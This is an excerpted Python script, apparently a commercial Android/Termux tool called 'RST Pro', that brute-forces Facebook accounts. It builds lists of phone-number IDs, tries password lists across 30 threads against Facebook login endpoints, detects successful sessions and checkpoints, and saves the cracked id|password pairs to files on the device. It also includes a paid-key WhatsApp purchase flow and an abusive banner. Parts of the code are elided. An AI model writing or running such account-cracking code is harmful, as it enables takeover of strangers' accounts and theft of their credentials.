...
os.system('xdg-open https://www.facebook.com/groups/795063638147934')
...
----------------------------------------------
 RST Pro version 2.0.
 For Haters: Tumhare Okat Nhi Mere BAAJI chodne Ke ðŸ¤ž
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/100082010261051/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801608069753&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi RST Sir, I Need To Buy Your Paid RST PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python RST.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as RST:     
                        clear()
                        tl = str(len(user))
...
def bd():
                ...
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 1000, 5000, 10000, 20000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RST-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RST=session.cookies.get_dict().keys()
                        if "c_user" in RST:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [RST-OK] %s | %s'%(ids,pas))
                                open('/sdcard/RST-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RST:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RST-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RST-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RST-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RST-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/RST-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [RST-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/RST-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [RST-OK] '+uid+' | '+pas+'\033[1;97m')
